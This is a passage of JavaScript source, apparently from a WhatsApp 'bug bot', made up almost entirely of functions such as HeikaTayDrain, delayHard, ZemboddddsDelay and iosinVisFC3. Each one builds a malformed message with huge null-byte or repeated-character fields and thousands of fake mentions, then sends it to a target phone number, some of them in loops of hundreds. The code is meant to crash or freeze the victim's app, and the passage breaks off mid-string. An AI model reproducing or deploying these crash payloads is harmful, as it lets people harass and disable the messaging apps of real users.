      additionalNodes: [{  
        tag: "meta",  
        attrs: {},  
        content: [{  
          tag: "mentioned_users",  
          attrs: {},  
          content: [{ tag: "to", attrs: { jid: target }, content: undefined }]  
        }]  
      }]  
    });  
    
    let bgs = {  
      viewOnceMessage: {  
        message: {  
          locationMessage: {  
            degreesLatitude: 21.1266,  
            degreesLongitude: -11.8199,  
            name: "Yee Jembud",  
            url: "https://t.me/OndetMpx",  
            contextInfo: {  
              mentionedJid: [  
                target,  
                ...Array.from({ length: 1900 }, () =>   
                  "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"  
                )  
              ],  
              isSampled: true,  
              participant: target,  
              remoteJid: "status@broadcast",  
              forwardingScore: 999999,  
              isForwarded: true,  
              quotedMessage: {  
                extendedTextMessage: {  
                  text: "\u0000".repeat(100000)  
                }  
              },  
              externalAdReply: {  
                advertiserName: "Mboh",  
                title: "Ondet X Jule",  
                body: "{ Pepek Jule Enak }",  
                mediaType: 1,  
                renderLargerThumbnail: true,  
                jpegThumbnail: null,  
                sourceUrl: "https://example.com"  
              },  
              placeholderKey: {  
                remoteJid: "0@s.whatsapp.net",  
                fromMe: false,  
                id: "ABCDEF1234567890"  
              }  
            }  
          },  
          nativeFlowMessage: {  
            buttons: [  
              {  
                name: "payment_method",  
                buttonParamsJson: "{}" + "\u0000".repeat(100000)  
              }  
            ],  
            messageParamsJson: "\x00\x00\x00"  
          }  
        }  
      }  
    };  

    const A4 = generateWAMessageFromContent(target, bgs, {});  

    await sock.relayMessage("status@broadcast", A4.message, {  
      messageId: A4.key.id,  
      statusJidList: [target],  
      additionalNodes: [{  
        tag: "meta",  
        attrs: {},  
        content: [{  
          tag: "mentioned_users",  
          attrs: {},  
          content: [{ tag: "to", attrs: { jid: target }, content: undefined }]  
        }]  
      }]  
    });  
  
    console.log("✅ berhasil dikirim ke:", target);  
  
  } catch (err) {  
    console.error("❌ Gagal kirim message:", err);  
  }  
}

async function HeikaTayDrain(sock, target) {
  let msg1 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: "ꦾ".repeat(27544),
          title: "!¿ Revengers ?¡",
          inviteLinkParentGroupSubjectV2: "\u0000".repeat(25000),
          inviteLinkParentGroupThumbnailV2: null,
          inviteLinkGroupTypeV2: "SUB",
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => '1' + Math.floor(Math.random() * 50000) + "@s.whatsapp.net"
              )
            ],
            stanzaId: null,
            participant: target,
            groupMentions: [
              {
                groupJid: null,
                groupSubject: null
              }
            ],
            parentGroupJid: "\u0000".repeat(45000),
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expireTimestamp: 7890
              }
            }
          }
        }
      }
    }
  }, {});
  
  await sock.relayMessage(target, msg1.message, {
    messageId: msg1.key.id,
    participant: { jid: target }
  });
  
  try {
    return true;
  } catch (e) {
    console.log(`Gagal`, e);
    return false;
  }
}

async function InvisibleDelay(sock, target) {
 for (let i = 0; i < 250; i++) {
  const R7XMsg = {
    viewOnceMessage: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/637975398_2002009003691900_8040701886006703825_n.enc?ccb=11-4&oh=01_Q5Aa3wG-6_BGPGfHNfyrcMFV71OBMz1Wotj66ClQWgKoRxmtfA&oe=69BFA77E&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "CleMtlrI+21HNQ298bFL4MaF6k9hJImlKgK7WAT/g+Y=",
          fileLength: "99999", 
          seconds: 10,
          mediaKey: "WlFBzxOj7hIziHuhR8gNCKE2YZSXgcLnfoydMn32FQI=",
          caption: "x10".repeat(30000),
          height: 720,
          width: 1280,
          fileEncSha256: "zTpAsUWfVLGid5PNcL6/39JVADbLUUK0PT2cxlGpsDA=",
          directPath: "/v/t62.7161-24/637975398_2002009003691900_8040701886006703825_n.enc?ccb=11-4&oh=01_Q5Aa3wG-6_BGPGfHNfyrcMFV71OBMz1Wotj66ClQWgKoRxmtfA&oe=69BFA77E&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1771576607",
          contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA",
            statusSourceType: "VIDEO",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            businessMessageForwardInfo: {
              businessOwnerJid: "13135550202@s.whatsapp.net",
              businessDescription: null
            },
            featureEligibilities: {
              canBeReshared: true
            },
            isForwarded: true,
            forwardingScore: 9999,
            statusAttributions: [
              {
                type: "MUSIC",
                externalShare: {
                  actionUrl: "https://wa.me/settings/linked_devices#,,x",
                  source: "INSTAGRAM",
                  duration: 9,
                  actionFallbackUrl: "https://wa.me/settings/linked_devices#,,x"
                }
              }
            ],
            streamingSidecar: "xUQqEMh4oVoqMy9qDBB3gaNI3yZbbX7dtli6KJ6N1ijvk09oVJzI8w==",
            thumbnailDirectPath: "/v/t62.36147-24/640522275_2376887426118122_4696194772404190783_n.enc?ccb=11-4&oh=01_Q5Aa3wHXgSUEMms1n1PJZN7I8Ip8kaEzKYH5nfr9X62LJNv1bw&oe=69BF74C1&_nc_sid=5e03e0",
            thumbnailSha256: "9kdKXkxHeCZxJ7WwQ00xanJD9CRLfgrs4lxLd/cRBXQ=",
            thumbnailEncSha256: "DuH7/OR2Jz+SPxDiNyl2wKdUDbr6upAQtCmjwAS22CA=",
            annotations: [
              {
                shouldSkipConfirmation: true,
                embeddedContent: {
                  embeddedMessage: {
                    stanzaId: "ACFC34B6742717BAC2BFE825254E1CD1",
                    message: {
                      extendedTextMessage: {
                        text: "x10".repeat(10000),
                        previewType: "NONE",
                        inviteLinkGroupTypeV2: "DEFAULT"
                      },
                      messageContextInfo: {
                        messageSecret: "1y9Zx4kWsv7YLUdsLvUAvSSxlE6KVPSyllLwgXkSzfg=",
                        messageAssociation: {
                          associationType: 18,
                          parentMessageKey: {
                            remoteJid: "status@broadcast",
                            fromMe: false,
                            id: "ACEEC73D18B6805DBC04CC8ADF65BF6D",
                            participant: "13135550202@s.whatsapp.net"
                          }
                        }
                      }
                    }
                  }
                }
              }
            ]
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", R7XMsg, {
    tag: "meta",
    attrs: {},
    content: [
      {
        tag: "mentioned_users",
        attrs: {},
        content: [
          {
            tag: "to",
            attrs: { jid: target },
            content: undefined
           }
         ]
       }
     ]
   });
  }
}

async function delayHard(sock, target) {
    const danzmsg = {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "\u0000".repeat(250000), // no ubah repeat
                        format: "DEFAULT", 
                    },
                    nativeFlowResponseMessage: {
                        buttons: [
                            {
                                name: "cta_flow_response",
                                buttonParamsJson: JSON.stringify({
                                    paramsJson: `{"flow_cta":"${"\u0000".repeat(90000)}"}`,
                                    entryPointConversionSource: "call_permission_request",
                                    version: 3
                                })
                            }
                        ]
                    }
                }
            }
        }
    };

    await sock.sendMessage(target, danzmsg);
}   

async function Zuembod(sock, target) {
    let kel = JSON.stringify({
      action: "x",
      data: "x"
    });
    await sock.relayMessage(target, {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "#" + "ꦾ".repeat(77777),
      publisher: "london",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: true,
          emojis: ["🥶"],
          accessibilityLabel: "",
          isLottie: true,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: true,
          emojis: ["🥶"],
          accessibilityLabel: "",
          isLottie: true,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: true,
          emojis: ["🥶"],
          accessibilityLabel: "",
          isLottie: true,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: true,
          emojis: ["🥶"],
          accessibilityLabel: "",
          isLottie: true,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: true,
          emojis: ["🥶"],
          accessibilityLabel: "",
          isLottie: true,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: true,
          emojis: ["🥶"],
          accessibilityLabel: "",
          isLottie: true,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: true,
          emojis: ["🥶"],
          accessibilityLabel: "",
          isLottie: true,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: true,
          emojis: ["🥶"],
          accessibilityLabel: "",
          isLottie: true,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
     remoteJid: "X",
      participant: "0@s.whatsapp.net",
      stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
      callLogMesssage: {
      isVideo: true,
      callOutcome: "REJECTED",
      durationSecs: "1",
      callType: "SCHEDULED_CALL",
       participants: [
           { jid: target, callOutcome: "CONNECTED" },
               { target: "0@s.whatsapp.net", callOutcome: "REJECTED" },
               { target: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
               { target: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                ]
              }
            },
         }
 }, {});
 
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "#" + "ꦾ",
          listType: 4,
          buttonText: { displayText: "🩸" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            mentionedJid: [target],
            participant: "0@s.whatsapp.net",
            remoteJid: "X",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "☀️",
              body: "🩸",
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: kel
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: kel
                },
              ],
            },
            extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "X" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
           participant: target, 
          }
        }
      }
    }
  }, {})
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
  console.log(chalk.red(`Succes To Send Bug To ${target}`));
}

async function ZemboddddsDelay(sock, target) {
  for (let z = 0; z < 1000; z++) {
    const msg = {
      ephemeralMessage: {
        message: {
          groupStatusMessageV2: {
            message: {
              viewOnceMessage: {
                message: {
                  interactiveMessage: {
                    body: {
                      text: "the man who can't be move"
                    },
                    nativeFlowMessage: {
                      buttons: [
                        { name: "\u0000\u0000\u0000", buttonParamsJson: "\u0000" },
                        { name: "single_select\u0000", buttonParamsJson: "{\u0000}" },
                        { name: "\x00\x00", buttonParamsJson: "\x00".repeat(198776) }
                      ]
                    },
                    nativeFlowResponseMessage: {
                      name: "address_message",
                      paramsJson: JSON.stringify({
                        flow_cta: "\u0000".repeat(2),
                        extra_data: {
                          address: {
                            in_pin_code: "999999",
                            building_name: "\u0000".repeat(198776),
                            landmark_area: "18+",
                            address: "london",
                            tower_number: "italia",
                            city: "florida",
                            name: "kelra".repeat(198776),
                            phone_number: "999999999999",
                            house_number: "13135550002",
                            floor_number: "@3135550202",
                            state: "X" + "\u0000".repeat(99987)
                          },
                          menu: {
                            display_text: "\u0000".repeat(198776),
                            description: "\u0000".repeat(198776),
                            id: "kel"
                          },
                          payment: {
                            flow_cta: "{".repeat(99876)
                          }
                        }
                      }),
                      version: 3
                    },
                    contextInfo: {
                      businessMessageForwardInfo: {
                        businessOwnerJid: "0@s.whatsapp.net"
                      },
                      isForwarded: true,
                      forwardingScore: 999,
                      quotedMessage: {
                        conversation: "Kelra Crash"
                      },
                      stanzaId: "BAE5" + Math.random().toString(16).slice(2),
                      participant: target,
                      remoteJid: target
                    },
                    header: {
                      hasMediaAttachment: true,
                      locationMessage: {
                        degreesLatitude: 21.1266,
                        degreesLongitude: -11.8199,
                        name: `#` + "????".repeat(1),
                        jpegThumbnail: null,
                        contextInfo: {
                          externalAdReply: {
                            quotedAd: {
                              advertiserName: "????".repeat(198776),
                              mediaType: "IMAGE",
                              jpegThumbnail: null,
                              caption: "????".repeat(198776)
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, msg, {
      participant: { jid: target }
    });

    await new Promise(res => setTimeout(res, delay));
  }
}

async function BlankDelay(sock, target) {
  let button = []; 
  
  for (let i = 0; i < 5; i++) {
    button.push(
      {
        buttonId: "OndetPcx",
        buttonText: {
          displayText: "ꦾ".repeat(50000)
        },
        type: 1
      },
      {
        buttonId: "PepekJuleAnget",
        buttonText: {
          displayText: "ꦾ".repeat(50000)
        },
        type: 1
      },
      {
        buttonId: "Yareu",
        buttonText: {
          displayText: "ꦾ".repeat(50000)
        },
        type: 1
      }
    );
  }
  
  const msg = {
    buttonsMessage: {
      contentText: "꧀".repeat(10000), 
      footerText: "ꦾ".repeat(20000),
      headerType: 1,
      text: "ꦾ".repeat(50000), 
      buttons: button
    },
    contextInfo: {
      mentionedJid: [
        "13135550202@s.whatsapp.net", 
        ...Array.from(
          { length: 2000 },
          () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
        )
      ],
      stanzaId: "X",
      participant: target,
      remoteJid: target,
      quotedMessage: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
          fileName: "Ondet Redy Vcs",
          fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
          directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1724474503",
          contactVcard: true,
          thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
          thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
          thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
          jpegThumbnail: ""
        },
        contextInfo: {
          mentionedJid: [
            "13135550202@s.whatsapp.net", 
            ...Array.from(
              { length: 2000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            )
          ]
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target }
  });
}

async function nullPacth(sock, target) { 
  let msg = {
    viewOnceMessage: {
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
          fileLength: "999999999999",
          pageCount: 1316134911,
          mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
          fileName: "Tes!!",
          fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
          directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc",
          mediaKeyTimestamp: "1743848703",
          caption: "ꦾ".repeat(180000),
          contextInfo: {
            mentionedJid: Array.from({length: 2000}, (_, i) => 
              `62${String(8000000000 + i).slice(0,11)}@s.whatsapp.net`
            ),
            groupMentions: [
              {
                groupJid: 'status@broadcast',
                groupSubject: 'ꦾ'.repeat(50000)
              }
            ],
            forwardingScore: 999,
            isForwarded: true,
            quotedMessage: {
              extendedTextMessage: {
                text: "ꦾ".repeat(10000),
                contextInfo: {
                  mentionedJid: ['0@s.whatsapp.net']
                }
              }
            },
            remoteJid: 'status@broadcast',
            participant: '0@s.whatsapp.net',
            stanzaId: 'BAE5' + Date.now(),
            pushName: 'ꦾ'.repeat(20000),
            expiration: 604262800,
            status: 3,
            deviceSentFrom: 'android'
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target }
  });

  const msg2 = {
    interactiveMessage: {
      header: {
        title: "🍁 Hay Salken Gw Revengers",
        subtitle: "ꦾ".repeat(10000),
        hasMediaAttachment: false
      },

      body: {
        text: "ꦾ".repeat(20000)
      },

      footer: {
        text: "ꦾ".repeat(20000)
      },

      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "ꦾ".repeat(20000),
              sections: [
                {
                  title: "ꦾ".repeat(5000),
                  rows: [
                    { title: "ꦾ".repeat(5000), description: "ꦾ".repeat(5000), id: "ꦾ".repeat(2000) },
                    { title: "ꦾ".repeat(5000), description: "ꦾ".repeat(5000), id: "ꦾ".repeat(2000) },
                    { title: "ꦾ".repeat(5000), description: "ꦾ".repeat(5000), id: "ꦾ".repeat(2000) }
                  ]
                },
                {
                  title: "ꦾ".repeat(20000) + "bokep simulator",
                  rows: [
                    { title: "ꦾ".repeat(5000), description: "ꦾ".repeat(5000), id: "ꦾ".repeat(2000) },
                    { title: "REVENGERS NIH, KENAL GA?", description: "\u0000".repeat(5000), id: "ꦾ".repeat(2000) }
                  ]
                }
              ]
            })
          }
        ]
      }
    }
  };

  await sock.relayMessage(target, msg2, {
    messageId: null,
    participant: { jid: target }
  });

  let msg3 = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ꦾ".repeat(63000),
            hasMediaAttachment: false
          },
          body: {
            text: "ꦾ".repeat(1024)
          },
          contextInfo: {
            forwardingScore: 9999,
            isForwarded: true,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast"
          },
          nativeFlowMessage: {
            buttons: [
              { name: "cta_call", buttonParamsJson: "" },
              { name: "call_permission_request", buttonParamsJson: JSON.stringify({ status: true }) }
            ],
            messageParamsJson: "{}"
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg3, {
    messageId: null,
    participant: { jid: target }
  });

  let msg4 = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ꦾ".repeat(20000),
            locationMessage: {
              degreesLatitude: 0,
              degreesLongitude: 0,
              name: "ꦾ".repeat(20000),
              address: "ꦾ".repeat(20000)
            },
            hasMediaAttachment: true
          },
          body: {
            text: "ꦾ".repeat(20000)
          },
          footer: {
            text: "ꦾ".repeat(20000)
          },
          nativeFlowMessage: {
            name: "ꦾ".repeat(20000),
            messageParamsJson: "ꦾ".repeat(20000)
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, (_, z) => 
              `1${3000000000 + z}@s.whatsapp.net`
            ),
            stanzaId: "ꦾ".repeat(5000),
            participant: target,
            isForwarded: true,
            forwardingScore: 99999
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg4, {
    messageId: null,
    participant: { jid: target }
  });
}
    
async function iosinVisFC3(sock, target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/OTAX",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "OTAX",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone, 
            matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAIwAjAMBIgACEQEDEQH/xAAcAAACAwEBAQEAAAAAAAAAAAACAwQGBwUBAAj/xABBEAACAQIDBAYGBwQLAAAAAAAAAQIDBAUGEQcSITFBUXOSsdETFiZ0ssEUIiU2VXGTJFNjchUjMjM1Q0VUYmSR/8QAGwEAAwEBAQEBAAAAAAAAAAAAAAECBAMFBgf/xAAxEQACAQMCAwMLBQAAAAAAAAAAAQIDBBEFEhMhMTVBURQVM2FxgYKhscHRFjI0Q5H/2gAMAwEAAhEDEQA/ALumEmJixiZ4p+bZyMQaYpMJMA6Dkw4sSmGmItMemEmJTGJgUmMTDTFJhJgUNTCTFphJgA1MNMSmGmAxyYaYmLCTEUPR6LiwkwKTKcmMjISmEmWYR6YSYqLDTEUMTDixSYSYg6D0wkxKYaYFpj0wkxMWMTApMYmGmKTCTAoamEmKTDTABqYcWJTDTAY1MYnwExYSYiioJhJiUz1z0LMQ9MOMiC6+nSexrrrENM6CkGpEBV11hxrrrAeScpBxkQVXXWHCsn0iHknKQSloRPTJLmD9IXWBaZ0FINSOcrhdYcbhdYDydFMJMhwrJ9I30gFZJKkGmRFVXWNhPUB5JKYSYqLC1AZT9eYmtPdQx9JEupcGUYmy/wCz/LOGY3hFS5v6dSdRVXFbs2kkkhW0jLmG4DhFtc4fCpCpOuqb3puSa3W/kdzY69ctVu3l4Ijbbnplqy97XwTNrhHg5xzPqXbUfNnE2Ldt645nN2cZdw7HcIuLm/hUnUhXdNbs2kkoxfzF7RcCsMBtrOpYRnB1JuMt6bfQdbYk9ctXnvcvggI22y3cPw3tZfCJwjwM45kStqS0zi7Vuwuff1B2f5cw7GsDldXsKk6qrSgtJtLRJeYGfsBsMEs7WrYxnCU5uMt6bfDQ6+x172U5v/sz8IidsD0wux7Z+AOEeDnHM6TtqPm3ibVuwueOZV8l2Vvi2OQtbtSlSdOUmovTijQfUjBemjV/VZQdl0tc101/Bn4Go5lvqmG4FeXlBRdWjTcoqXLULeMXTcpIrSaFCVq6lWKeG+45iyRgv7mr+qz1ZKwZf5NX9RlEjtJxdr+6te6/M7mTc54hjOPUbK5p0I05xk24RafBa9ZUZ0ZPCXyLpXWnVZqEYLL9QWasq0sPs5XmHynuU/7dOT10XWmVS0kqt1Qpy13ZzjF/k2avmz7uX/ZMx/DZft9r2sPFHC4hGM1gw6pb06FxFQWE/wAmreqOE/uqn6jKLilKFpi9zb0dVTpz0jq9TWjJMxS9pL7tPkjpdQjGKwjXrNvSpUounFLn3HtOWqGEek+A5MxHz5Tm+ZDu39VkhviyJdv6rKMOco1vY192a3vEvBEXbm9MsWXvkfgmSdjP3Yre8S8ERNvGvqvY7qb/AGyPL+SZv/o9x9jLsj4Q9hr1yx